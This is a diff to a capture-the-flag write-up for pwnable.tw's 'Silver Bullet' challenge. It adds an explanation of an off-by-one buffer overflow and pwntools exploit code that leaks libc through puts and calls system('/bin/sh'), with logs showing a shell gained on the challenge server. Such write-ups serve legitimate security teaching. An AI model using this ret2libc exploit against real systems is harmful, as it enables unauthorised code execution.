@@ -273,6 +273,7 @@ The function:
 - [3] concatenates new description to old description
 - [4] updates description lenght
 
+## Buffer overflow
 Can you spot the bug? There is off-by-one vulnerability in the code. Let's say we have created a bullet and entered a power_up function:
 
 ```bash
@@ -339,4 +340,70 @@ Leaving the final bullet_desc in such state:
 
 ![](img/bullet_desc2.png)
 
-That's amazing. You know why? Well, we now have buffer overflow as we can overflow a buffer by 47 bytes with power_up function. The DEP protection is enabled so we will want to invoke system function from libc. Unfortunetely we will have to bypass ASLR first.
+## Exploit
+That's amazing. You know why? Well, we now have buffer overflow as we can overflow a buffer by 47 bytes with power_up function. The DEP protection is enabled so we will want to invoke system function from libc. There is one more thing! To return from main function we have to kill the wolf (the return action will only call exit). But this is easy this time as our power will now be some huge number (for ex. if we now call power_up(b'CCC') our power will become: 0x43434304) and it should take like 2-4 seconds to kill the beast!
+
+## Leak libc_base
+Unfortunetely we will have to bypass ASLR first, meaning we need to leak some libc address. This can be by using standard technique: calling plt@puts with got@puts as an argument.
+This is easy, havning buffer overflow vulnerability we will call power_up with such payload:
+
+```python
+payload = b'C' * 7 + p32(e.plt['puts']) + p32(e.symbols['main']) + p32(e.got['puts'])
+```
+
+The 'CCCCCCC' is some junk to reach return address. Then we overwrite return address with plt@puts providing a got@puts address as argument. At the end we want to jump back to main as we will want to repeat the whole operation but this time we will call system function.
+Let's check if we managed to leak libc_base:
+
+```python
+# Leak libc phrase
+log.info("Started leak libc phrase...")
+create_bullet(b'A' * (BULLET_DESC_SZ - 1))
+power_up(b'B')
+
+payload = b'C' * 7 + p32(e.plt['puts']) + p32(e.symbols['main']) + p32(e.got['puts'])
+power_up(payload)
+
+kill_beast()
+puts = u32(p.recvline()[:-1])
+libc_base = puts - libc.symbols['puts']
+log.info("[x] Leaked libc_base: " + hex(libc_base))
+```
+
+Let's try it:
+```bash
+$ python exp.py remote
+[+] Opening connection to chall.pwnable.tw on port 10103: Done
+[*] Started leak libc phrase...
+[*] [x] Leaked libc_base: 0xf75e3000
+```
+
+Super! So now we just have to repeat the whole proccess as mentioned above and call system('/bin/sh');
+
+```python
+# Spawn shell phrase
+log.info("Started spawn shell phrase...")
+create_bullet(b'A' * (BULLET_DESC_SZ - 1))
+power_up(b'B')
+
+payload = b'C' * 7
+payload += p32(libc_base + libc.symbols['system']) + b'AAAA' + p32(libc_base + BINSH_OFST)
+power_up(payload)
+
+kill_beast()
+p.interactive()
+```
+
+Let's try it out! [Full exploit](epx.py)
+
+```bash
+$ python3 exp.py remote
+[+] Opening connection to chall.pwnable.tw on port 10103: Done
+[*] Started leak libc phrase...
+[*] [x] Leaked libc_base: 0xf75e5000
+[*] Started spawn shell phrase...
+[*] Switching to interactive mode
+$ id
+uid=1000(silver_bullet) gid=1000(silver_bullet) groups=1000(silver_bullet)
+```
+
+Nice, we just got a shell!
